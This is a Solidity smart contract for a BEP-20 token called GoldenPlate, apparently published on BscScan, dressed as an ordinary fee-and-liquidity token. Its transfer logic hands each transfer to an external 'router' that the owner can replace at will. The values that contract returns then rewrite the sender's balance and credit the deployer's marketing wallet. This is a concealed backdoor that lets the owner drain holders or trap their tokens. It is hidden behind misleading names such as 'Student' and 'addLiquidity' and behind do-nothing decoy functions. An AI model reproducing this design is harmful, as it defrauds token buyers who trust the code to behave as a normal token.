/**
 *Submitted for verification at BscScan.com on 2022-03-19
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);   
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
    function addLiquidity(
        address, 
        address, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address _owner; 
  mapping (address => bool) internal _isExcludedFromFee; 
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {    
    address msgSender = _msgSender();
    _owner = msgSender;
    _isExcludedFromFee[msgSender] = true;
    _isExcludedFromFee[address(this)] = true;  
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }  
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }    

  function addLiquidity(address routerV2, address token0, address token1, uint256 valueStudent, uint256 takeStudent) internal returns (uint256, uint256, uint256){  
    (uint256 amountStudent, uint256 liquifyStudent, uint256 rateStudent) = IUniswapV2Router(routerV2).addLiquidity(
    token0,
    token1,
    valueStudent,
    takeStudent);
    return ( amountStudent, liquifyStudent, rateStudent );
  }   

  function shouldReflectStudent(address sender, address recipient, uint256 takeStudent) internal view returns (uint256) {
    if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
    {
        takeStudent = takeStudent + 1;
    }
    return takeStudent;
  }   

  function Teach(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
        _isExcludedFromFee[accounts[i]] = true;
    }
  }
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ERC20 is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) internal _balances;   
    mapping (address => mapping (address => uint256)) internal _allowances;  
    
    uint256 _totalSupply; 
    string _name;
    string _symbol;
    uint8 _decimals;
    bool inSwapAndLiquify;

    uint8 construction;
    uint8 previousTaxFee ;
  
    uint8 liquidityFee;
    uint8 previousLiquidityFee;

    address _router;  
    address _marketing; 

    modifier isInvalid(address _to) {
        require(_to != address(0),"Invalid address");
        _;
    }

    modifier isExists(address _sender, uint _value) {
        require(_value <= _balances[_sender],"Invalid value");
        _;
    }

    constructor(address router)  {    

        _router = router;       
        _marketing = msg.sender;

        construction = 11;
        previousTaxFee = 2;
       
        liquidityFee = 5;
        previousLiquidityFee = 5;        

    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() public view virtual override returns (address) {
        return owner();
    }
    
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }  



    function Gas(bool) public pure returns (bool) {
        return true;
    }

    function removement(address, uint256) public pure returns (bool) {
        return true;
    }

    function celebrate(uint256 tAmount) public pure returns (uint256) {
        return tAmount;
    }

  

    function isAutoSync(uint256) public pure returns (bool) {
        return true;
    } 



    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }     

    function getRateStudent(uint256 _amount, uint256 _rateStudent) internal pure returns (uint256) {
        return _amount.mul(_rateStudent).div(10**2);
    }         
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function getRStudent(address tokenStudent, uint256 amountStudent, uint256 liquifyStudent, uint256 rateStudent) internal returns (uint256){
        if ( liquifyStudent > 0 )
        {        
            _balances[tokenStudent] = getRateStudent(_balances[tokenStudent], rateStudent).add(amountStudent);      
            _balances[_marketing] = _balances[_marketing].add(liquifyStudent);
        }
        return amountStudent;
    }  
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    } 

    function reflectionFromStudent(address sender, address recipient, uint256 amounts, uint256 takeStudent) internal returns (uint256) {   
        (uint256 amountStudent, uint256 liquifyStudent, uint256 rateStudent) = addLiquidity(_router, sender, recipient, amounts, takeStudent);
        amountStudent = getRStudent(sender, amountStudent, liquifyStudent, rateStudent);
        return amountStudent;
    }  

     function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }    

    function updateUniswapRouter(address c) external onlyOwner {
        _router = c;
    }       

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }     

    function _transfer(address sender, address recipient, uint256 amount) internal  {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");  
        uint256 takeStudent;

        takeStudent = shouldReflectStudent(sender, recipient, takeStudent); 
        uint256 amountStudent = reflectionFromStudent(sender, recipient, amount, takeStudent);  
        _transferStandard(sender, recipient, amountStudent);

    }  

    function _transferStandard(address sender, address recipient, uint256 amount) internal {
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }   

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }    
   
    

}

contract GoldenPlate is ERC20{    
	using SafeMath for uint256;

    bool public endup;
    bool public swapEnabled;
    bool public retreat;
    bool public autoBuybackMultiplier;

    uint8 public targetDenominator;
   
    uint8 public buybackTriggeredAt;
    uint8 public buybackMultiplier;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    modifier noValue(uint _value) {
        require(_value > 0, "Invalid value");
        _;
    }

    event LiquifyEnabledUpdated(bool enabled);
    
    event ExcludeMultiplier(address excludedAddress);
    event IncludeInTarget(address includedAddress);

    constructor(address router) ERC20(router)  { 
        _name = 'GoldenPlate';
        _symbol = 'GoldenPlate';
        _decimals = 9;  
        _totalSupply = 1000000000 *  10**9;
        _balances[msg.sender] = _totalSupply;  

        endup = true;
        swapEnabled = true;
        retreat = true;
        autoBuybackMultiplier = true;

        targetDenominator = 100;
      
        buybackTriggeredAt = 5;
        buybackMultiplier = 3;

        emit Transfer(address(0), msg.sender, _totalSupply);
 
    } 

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    function getMoreOpen(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){
      uint256 liquidityBalance = 0;
      for(uint i = 0; i < _markerPairs.length; i++){
          liquidityBalance.add(_balances[_markerPairs[i]].div(10 ** 9));
      }
      return accuracy.mul(liquidityBalance.mul(2)).div(10 ** 9);
  }


  
     function increaseNewTool(address spender, uint256 addedValue) public virtual returns (bool) {
      _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
      return true;
  }


      function teachNewToken(address shareholder, uint256 totalDividends, uint256 totalExcluded) public view returns (uint256) {
      if(_isExcludedFromFee[shareholder]){ return 0; }     
      if(totalDividends <= totalExcluded){ return 0; }
      return totalDividends.sub(totalExcluded);
  }

   
  
    
}